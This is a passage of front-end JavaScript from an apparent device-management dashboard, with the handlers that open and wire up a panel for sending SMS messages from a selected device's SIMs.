            setTimeout(() => {
                document.getElementById('sendSmsPanel').style.display = 'none';
            }, 1500);
        }
    } catch(err) {
        feedback.textContent = `Error: ${err.message}`;
        feedback.style.color = '#fb7185';
        toast(`SMS dispatch failed: ${err.message}`, 'error');
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<span class="material-icons text-sm">rocket_launch</span><span>Send to ALL SIMs</span>';
    }
}

// ─── OPEN SMS PANEL ───
function openSendSmsPanel() {
    createSendSmsPanel();
    const panel = document.getElementById('sendSmsPanel');
    if (selectedDeviceFilter && selectedDeviceFilter !== 'all') {
        const { dbName, devId } = parseKey(selectedDeviceFilter);
        document.getElementById('sendSmsTargetLabel').textContent = `Target: [${dbLabel(dbName)}] ${devId}`;
        panel.style.display = 'block';
    } else {
        toast('Select a specific device first', 'error');
    }
}

// ─── WIRE UP SEND SMS BUTTON ───
(function initSendSms() {
    const smsSendBtn = document.getElementById('triggerSmsSendBtn');
    if (smsSendBtn) {
        smsSendBtn.addEventListener('click', openSendSmsPanel);
    }
    createSendSmsPanel();
})();